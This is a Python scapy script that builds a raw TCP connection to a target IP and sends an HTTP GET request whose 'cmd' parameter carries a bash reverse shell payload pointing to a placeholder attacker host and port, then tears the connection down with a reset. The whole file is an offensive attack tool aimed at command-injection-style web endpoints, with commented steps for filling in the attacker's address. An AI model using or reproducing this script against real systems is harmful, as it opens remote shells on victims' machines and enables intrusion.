from scapy.all import *
import random

def craft_http_get_request(target_ip, target_port=80, path="/"):
    # Reverse shell payload (Example for a Linux system)
    reverse_shell_payload = (
        "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"
    )

    # HTTP GET request payload with the reverse shell injected
    http_payload = (
        f"GET {path}?cmd={reverse_shell_payload} HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/86.0.4240.75 Safari/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Connection: keep-alive\r\n\r\n"
    )

    # Create IP and TCP layers
    ip_layer = IP(dst=target_ip)
    tcp_layer = TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S")
    
    # Initiate TCP handshake (SYN, SYN-ACK, ACK)
    syn_ack = sr1(ip_layer/tcp_layer, timeout=2, verbose=0)
    if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 0x12:
        ack_packet = ip_layer / TCP(dport=target_port, sport=tcp_layer.sport, flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1)
        send(ack_packet, verbose=0)

        # Send the HTTP GET request with the reverse shell payload
        http_request = ip_layer / TCP(dport=target_port, sport=tcp_layer.sport, flags="PA", seq=syn_ack.ack, ack=syn_ack.seq + 1) / http_payload
        send(http_request, verbose=0)

        # Gracefully close the connection with RST
        rst_packet = ip_layer / TCP(dport=target_port, sport=tcp_layer.sport, flags="R", seq=syn_ack.ack + len(http_payload))
        send(rst_packet, verbose=0)
        print("HTTP GET request with reverse shell payload sent successfully.")
    else:
        print("Failed to establish a connection with the target.")

# Parameters for the target
target_ip = "192.168.56.103"  # Replace with the target IP
target_port = 80  # HTTP port
#attacker_ip = "YOUR_ATTACKER_IP"  # Replace with your attacker's IP
#attacker_port = 4444  # The port for the reverse shell to connect to

# Modify the reverse shell payload with attacker's IP and port
#reverse_shell_payload = reverse_shell_payload.replace("ATTACKER_IP", attacker_ip).replace("ATTACKER_PORT", str(attacker_port))

# Run the crafted HTTP GET request with the reverse shell
craft_http_get_request(target_ip, target_port)

